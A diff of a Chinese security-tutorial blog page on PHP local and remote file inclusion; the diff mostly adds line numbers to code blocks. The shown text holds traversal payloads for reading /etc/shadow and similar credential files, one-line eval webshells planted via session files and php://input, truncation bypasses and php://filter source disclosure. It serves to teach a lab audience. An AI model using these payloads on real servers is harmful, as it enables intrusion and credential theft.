@@ -281,53 +281,123 @@ if (!doNotTrack) {
 <h3 id="文件包含是什么-我们为什么要使用它">文件包含是什么？我们为什么要使用它？</h3>
 <p>文件包含在网页开发中会经常被使用到，比如导航栏，亦或是页眉，往往都是单独的一个php文件，然后每一个页面只需要将这个php文件包含进来而节省了重复开发的时间，还有一种常见的形式就是sql连接，大家在搭建靶场的时候相信经常都会遇到的配置问题，例如修改端口号，Mysql账号密码等，都可以在一个专门的php文件中修改，而不是需要在每一个sql连接的地方去做修改。 <!-- raw HTML omitted --></p>
 <p>PHP文件包含函数： <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require</span><span class="p">()</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="k">require_once</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl"><span class="k">include_once</span><span class="p">()</span>
-</span></span></code></pre></div><p><code>include()</code> 和 <code>require</code> 的却别在于当包含过程中处理错误的方式，include会抛出警告，程序正常运行；而require会选择直接报错并且退出程序的执行 <!-- raw HTML omitted --></p>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>include()</code> 和 <code>require</code> 的却别在于当包含过程中处理错误的方式，include会抛出警告，程序正常运行；而require会选择直接报错并且退出程序的执行 <!-- raw HTML omitted --></p>
 <p>两个once都表示文件只包含一次，为了避免重复包含带来的函数重定义。 <!-- raw HTML omitted --></p>
 <h3 id="文件包含漏洞产生的原因">文件包含漏洞产生的原因</h3>
 <p>对于用户的输入没有做严格的审核，还是这个老问题，包含的文件需要用户的输入，那么如果没有经过严格的审核，被黑客包含了其他恶意的文件，亦或是被利用执行了额外的代码，就会造成危害。 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p>例如这里这个GET参数，就可以轻易被修改（修改url即可） <!-- raw HTML omitted --></p>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>例如这里这个GET参数，就可以轻易被修改（修改url即可） <!-- raw HTML omitted --></p>
 <h3 id="local-file-inclusion-本地文件包含漏洞">Local File Inclusion 本地文件包含漏洞</h3>
 <p>本地文件包含漏洞，这里“本地”指的是服务器本地，主要是利用目录遍历的手法加上操作系统常见的敏感文件路径来读取信息 <!-- raw HTML omitted --></p>
 <p>Windows系统 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c:\boot.ini // 查看系统版本
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">c:\boot.ini // 查看系统版本
 </span></span><span class="line"><span class="cl">c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件
 </span></span><span class="line"><span class="cl">c:\windows\repair\sam // 存储Windows系统初次安装的密码
 </span></span><span class="line"><span class="cl">c:\ProgramFiles\mysql\my.ini // MySQL配置
 </span></span><span class="line"><span class="cl">c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码
 </span></span><span class="line"><span class="cl">c:\windows\php.ini // php 配置信息
-</span></span></code></pre></div><p>*inux 系统 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passwd // 账户信息
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>*inux 系统 <!-- raw HTML omitted --></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/etc/passwd // 账户信息
 </span></span><span class="line"><span class="cl">/etc/shadow // 账户密码文件
 </span></span><span class="line"><span class="cl">/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件
 </span></span><span class="line"><span class="cl">/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置
 </span></span><span class="line"><span class="cl">/usr/local/app/php5/lib/php.ini // PHP相关配置
 </span></span><span class="line"><span class="cl">/etc/httpd/conf/httpd.conf // Apache配置文件
 </span></span><span class="line"><span class="cl">/etc/my.conf // mysql 配置文件
-</span></span></code></pre></div><p>利用的形式大致如此： <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www.example.org/index.php?filename=../../../../../../../etc/passwd
-</span></span></code></pre></div><h4 id="session-文件包含漏洞">Session 文件包含漏洞</h4>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用的形式大致如此： <!-- raw HTML omitted --></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">www.example.org/index.php?filename=../../../../../../../etc/passwd
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="session-文件包含漏洞">Session 文件包含漏洞</h4>
 <p>Session文件包含漏洞一般发生在用户输入将会存入session文件中，我们可以通过植入恶意代码到session文件中，然后执行session文件让里面的恶意代码被解析然后执行 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$ctfs</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ctfs&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span><span class="o">=</span><span class="nv">$ctfs</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p>我们可以通过phpinfo获取我们本地的session存储位置，然后猜测目标服务器的session存放地址 <!-- raw HTML omitted -->
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们可以通过phpinfo获取我们本地的session存储位置，然后猜测目标服务器的session存放地址 <!-- raw HTML omitted -->
 假设为/Applications/MAMP/tmp/php <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-21_10-12-56_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
 <p>然后我们可以将恶意代码当作参数执行 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/session.php?ctfs=&lt;?php phpinfo();?&gt;
-</span></span></code></pre></div><p>然后通过浏览器的开发者工具确认cookie的名字 <!-- raw HTML omitted --></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/session.php?ctfs=&lt;?php phpinfo();?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后通过浏览器的开发者工具确认cookie的名字 <!-- raw HTML omitted --></p>
 <p>接着在本地查看我们的恶意代码是否注入成功 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-21_10-18-11_screenshot.png" width="700px"/>
 </figure>
@@ -340,8 +410,15 @@ if (!doNotTrack) {
 </figure>
  <!-- raw HTML omitted --></p>
 <p>同样我们也可以注入一句话木马 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiSession.php?ctfs=&lt;?php @eval($_POST[&#34;a&#34;]);?&gt;
-</span></span></code></pre></div><p>然后用蚁剑连接成功 <!-- raw HTML omitted --></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiSession.php?ctfs=&lt;?php @eval($_POST[&#34;a&#34;]);?&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后用蚁剑连接成功 <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-21_10-24-26_screenshot.png" width="700px"/>
 </figure>
  <!-- raw HTML omitted --></p>
@@ -351,11 +428,21 @@ if (!doNotTrack) {
 <li>
 <p>%00截断</p>
 <p>条件：magic_quotes_gpc = Off php版本&lt;5.3.4 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p>通过添加%00截断后面的html <!-- raw HTML omitted --></p>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过添加%00截断后面的html <!-- raw HTML omitted --></p>
 </li>
 </ul>
 <!-- raw HTML omitted -->
@@ -368,50 +455,123 @@ if (!doNotTrack) {
 <li>Linux下目录最大长度为4096字节，超出的部分会被丢弃。 <!-- raw HTML omitted --></li>
 </ul>
 <p>沿用上一个例子，将html超出范围后舍弃 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
-</span></span></code></pre></div></li>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=test.txt/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p>点号截断</p>
 <p>条件：windows OS，点号需要长于256 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span> <span class="o">.</span> <span class="s2">&#34;.html&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
-</span></span></code></pre></div></li>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=test.txt.................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
 <h3 id="remote-file-inclusion-远程文件包含漏洞">Remote File Inclusion 远程文件包含漏洞</h3>
 <p>远程文件包含漏洞，这里的“远程”指的是包含服务器以外的远程文件 <!-- raw HTML omitted --></p>
 <p>漏洞执行条件 <!-- raw HTML omitted -->
 这里需要满足两个参数的开启 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">allow_url_fopen = On（是否允许打开远程文件）
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">allow_url_fopen = On（是否允许打开远程文件）
 </span></span><span class="line"><span class="cl">allow_url_include = On（是否允许include/require远程文件）
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl">    <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl">    <span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php
-</span></span></code></pre></div><h4 id="常见绕过">常见绕过</h4>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="常见绕过">常见绕过</h4>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p>问号绕过</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php?
-</span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php?
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
 <p>#绕过</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php#
-</span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">localhost/lrfiTest.php?filename=xxx.xxx.xxx/trojan.php#
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
 <h3 id="php-supported-protocols-and-wrappers-php伪协议">PHP Supported Protocols and Wrappers PHP伪协议</h3>
 <p>PHP伪协议主要是一系列以与URI scheme的外形相似的封装协议，用来与 <code>fopen()</code>, <code>copy()</code>, <code>file_exists()</code>, <code>filesize()</code> 配合使用，同时也可以用 <code>stream_wrapper_register()</code> 创造新的方法。 <!-- raw HTML omitted --></p>
@@ -476,14 +636,32 @@ if (!doNotTrack) {
 </tbody>
 </table></div>
 <p>试一下试试 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$filename</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p>这里我们通过 <code>php://filter</code> 可以得到 <code>lrfiSession.php</code> 中以base64加密的内容，然后再解密得到其明文内容 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=php://filter/read=convert.base64-encode/resource=lrfiSession.php
-</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-21_22-56-31_screenshot.png" width="700px"/>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里我们通过 <code>php://filter</code> 可以得到 <code>lrfiSession.php</code> 中以base64加密的内容，然后再解密得到其明文内容 <!-- raw HTML omitted --></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=php://filter/read=convert.base64-encode/resource=lrfiSession.php
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/ox-hugo/2022-05-21_22-56-31_screenshot.png" width="700px"/>
     </figure>
  <!-- raw HTML omitted --></p>
 <p><figure><img src="/ox-hugo/2022-05-21_23-00-43_screenshot.png" width="700px"/>
@@ -501,14 +679,38 @@ if (!doNotTrack) {
 <p>php://input是一个“只读”的流，它允许我们直接读取POST上没有经过解析的原始数据 <!-- raw HTML omitted --></p>
 <p>enctype=&ldquo;multipart/form-data&rdquo; 的时候 php://input 是无效的 <!-- raw HTML omitted --></p>
 <p>需要同时开启 <code>allow_url_fopen</code> ，以及 <code>allow_url_include</code> <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
 </span></span><span class="line"><span class="cl"><span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
 </span></span><span class="line"><span class="cl"><span class="k">include</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p>我们可以利用 <code>php://input</code> 来执行POST中的php代码，从而写入一句话木马到服务器文件目录下 <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=php://input
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">PHP</span> <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;lrfiInput.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php eval($_POST[a]) ?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
-</span></span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-21_23-18-41_screenshot.png" width="700px"/>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们可以利用 <code>php://input</code> 来执行POST中的php代码，从而写入一句话木马到服务器文件目录下 <!-- raw HTML omitted --></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://localhost/lrfiTest.php?filename=php://input
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">PHP</span> <span class="nx">fputs</span><span class="p">(</span><span class="nx">fopen</span><span class="p">(</span><span class="s1">&#39;lrfiInput.php&#39;</span><span class="p">,</span><span class="s1">&#39;w&#39;</span><span class="p">),</span><span class="s1">&#39;&lt;?php eval($_POST[a]) ?&gt;&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><img src="/ox-hugo/2022-05-21_23-18-41_screenshot.png" width="700px"/>
     </figure>
  <!-- raw HTML omitted --></p>
 </li>
@@ -523,7 +725,19 @@ if (!doNotTrack) {
 <h4 id="file">file://</h4>
 <p>file:// 代表了本地文件的路径，它也是默认的分装类，如果文件路径没有指明使用哪一个分装类，那就默认是 file:// <!-- raw HTML omitted --></p>
 <p>Usage <!-- raw HTML omitted --></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
